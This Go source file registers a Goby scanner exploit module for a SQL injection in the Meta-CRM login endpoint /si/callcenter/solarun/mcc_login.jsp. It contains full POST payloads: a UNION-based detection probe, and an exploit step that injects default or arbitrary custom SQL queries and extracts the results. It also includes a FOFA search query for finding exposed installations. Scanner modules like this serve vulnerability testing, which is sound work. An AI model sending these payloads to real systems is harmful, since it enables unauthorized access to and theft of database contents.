package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Meta-CRM /si/callcenter/solarun/mcc_login.jsp SQL Injection Vulnerability",
    "Description": "<p>Meta-CRM is an enterprise customer relationship management system. This vulnerability exists in the /si/callcenter/solarun/mcc_login.jsp interface, allowing attackers to inject malicious SQL statements into the workerid parameter, thereby obtaining sensitive information from the database or executing arbitrary SQL commands, which may lead to data leakage, tampering, or system control.</p>",
    "Product": "MetaCRM6",
    "Homepage": "http://www.metasoft.com.cn/technology/index.html",
    "DisclosureDate": "2025-01-10",
    "PostTime": "2025-01-17",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"metasoft\" && body=\"login_module\"",
    "GobyQuery": "body=\"metasoft\" && body=\"login_module\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows attackers to obtain sensitive information from the database or execute arbitrary SQL commands through SQL injection, which may result in data leakage, tampering, or system control, causing severe consequences.</p>",
    "Recommendation": "<p>It is recommended to strictly parameterize all user inputs to avoid directly concatenating SQL statements. Additionally, upgrade to the latest version of Meta-CRM and enable security measures such as WAF (Web Application Firewall) to prevent the execution of malicious requests.</p>",
    "References": [
        "/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "SELECT DB_NAME(),SELECT @@VERSION,SELECT SYSTEM_USER",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT DB_NAME()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/si/callcenter/solarun/mcc_login.jsp",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "workerid=1%27+UNION+ALL+SELECT+CHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%2869%29%2BCHAR%28109%29%2BCHAR%2865%29%2BCHAR%2889%29%2BCHAR%28109%29%2BCHAR%2885%29%2BCHAR%2867%29%2BCHAR%28111%29%2BCHAR%28101%29%2BCHAR%2881%29%2BCHAR%2877%29%2BCHAR%28102%29%2BCHAR%28110%29%2BCHAR%2865%29%2BCHAR%2884%29%2BCHAR%28113%29%2BCHAR%2872%29%2BCHAR%2875%29%2BCHAR%2889%29%2BCHAR%28115%29%2BCHAR%2873%29%2BCHAR%28103%29%2BCHAR%28109%29%2BCHAR%2880%29%2BCHAR%2885%29%2BCHAR%2865%29%2BCHAR%28104%29%2BCHAR%2874%29%2BCHAR%28110%29%2BCHAR%2876%29%2BCHAR%2889%29%2BCHAR%2868%29%2BCHAR%2878%29%2BCHAR%2879%29%2BCHAR%28118%29%2BCHAR%2867%29%2BCHAR%2880%29%2BCHAR%2899%29%2BCHAR%28115%29%2BCHAR%2881%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28113%29--+kngp&passwd=abc123def&rtype=call400"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "qjbxqEmAYmUCoeQMfnATqHKYsIgmPUAhJnLYDNOvCPcsQqbjqq",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/si/callcenter/solarun/mcc_login.jsp",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Expires": "0",
                    "Pragma": "no-cache"
                },
                "data_type": "text",
                "data": "workerid=1%27+UNION+ALL+SELECT+%27112233%27%2B%28{{{payload_encode}}}%29%2B%27332211%27--+kngp&passwd=abc123def&rtype=call400"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|112233([^'][\\s\\S]*?)332211",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "美特-crm /si/callcenter/solarun/mcc_login.jsp SQL 注入漏洞",
            "Product": "美特软件-MetaCRM6",
            "Description": "<p>美特-crm 是一款企业客户关系管理系统。该漏洞存在于 /si/callcenter/solarun/mcc_login.jsp 接口中，攻击者可以通过构造恶意的SQL语句注入参数 workerid，进而获取数据库中的敏感信息或执行任意SQL命令，可能导致数据泄露、篡改或系统控制。</p>",
            "Recommendation": "<p>建议对所有用户输入进行严格的参数化处理，避免直接拼接SQL语句。同时，升级到最新版本的美特-crm，并启用WAF（Web应用防火墙）等安全措施，防止恶意请求的执行。</p>",
            "Impact": "<p>该漏洞允许攻击者通过SQL注入获取数据库中的敏感信息或执行任意SQL命令，可能导致数据泄露、篡改或系统控制等严重后果。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Meta-CRM /si/callcenter/solarun/mcc_login.jsp SQL Injection Vulnerability",
            "Product": "MetaCRM6",
            "Description": "<p>Meta-CRM is an enterprise customer relationship management system. This vulnerability exists in the /si/callcenter/solarun/mcc_login.jsp interface, allowing attackers to inject malicious SQL statements into the workerid parameter, thereby obtaining sensitive information from the database or executing arbitrary SQL commands, which may lead to data leakage, tampering, or system control.</p>",
            "Recommendation": "<p>It is recommended to strictly parameterize all user inputs to avoid directly concatenating SQL statements. Additionally, upgrade to the latest version of Meta-CRM and enable security measures such as WAF (Web Application Firewall) to prevent the execution of malicious requests.</p>",
            "Impact": "<p>This vulnerability allows attackers to obtain sensitive information from the database or execute arbitrary SQL commands through SQL injection, which may result in data leakage, tampering, or system control, causing severe consequences.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "payload_encode": "define|query_encode|{{{payload}}}"
    },
    "VariablesOrder": [
        "payload",
        "payload_encode"
    ],
    "EditType": "fast",
    "PocId": "9983"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
